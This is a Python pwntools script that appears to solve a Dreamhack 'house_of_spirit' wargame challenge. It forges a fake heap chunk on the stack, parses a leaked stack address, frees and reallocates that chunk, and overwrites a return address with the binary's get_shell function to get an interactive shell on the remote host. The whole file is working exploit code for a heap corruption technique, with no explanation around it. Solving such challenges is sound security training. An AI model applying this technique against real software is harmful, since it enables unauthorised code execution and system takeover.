from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

#p = process('./house_of_spirit')
p = remote('host3.dreamhack.games',  8575)

e = ELF('./house_of_spirit')


get_shell_addr = e.symbols['get_shell']

fake_chunk = b'A' * 0x10
fake_chunk += p64(0)
fake_chunk += p64(0x31) #이거 0x30 도 ㄱㄴ 근데 플래그 prev in use 넣으려고 (병합 방지용)

p.sendafter(b'name: ', fake_chunk[:-1])


leak_line = p.recvline().strip()
stack_addr = int(leak_line.split(b':', 1)[0], 16)
log.info(f'stack (name) address: {hex(stack_addr)}')

p.sendlineafter(b'> ',b'2')
p.sendlineafter(b'Addr: ',str(stack_addr + 0x20).encode())


p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Size: ',b'32')

payload = b'A' * 0xc
payload += p32(0)
payload += b'B' * 8
payload += p64(get_shell_addr)
p.sendafter(b'Data: ',payload)

p.sendlineafter(b'> ',b'3')


p.interactive()
